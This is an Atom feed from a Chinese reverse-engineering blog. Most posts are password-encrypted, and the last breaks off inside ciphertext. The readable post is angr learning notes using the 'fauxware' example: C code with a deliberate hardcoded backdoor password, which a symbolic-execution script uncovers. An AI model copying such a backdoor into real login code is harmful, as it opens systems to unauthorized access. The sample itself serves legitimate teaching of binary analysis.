<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-04-25T08:18:06.964Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-25T08:18:06.964Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-28T07:55:07.316Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-25T10:31:16.149Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-02T10:54:02.233Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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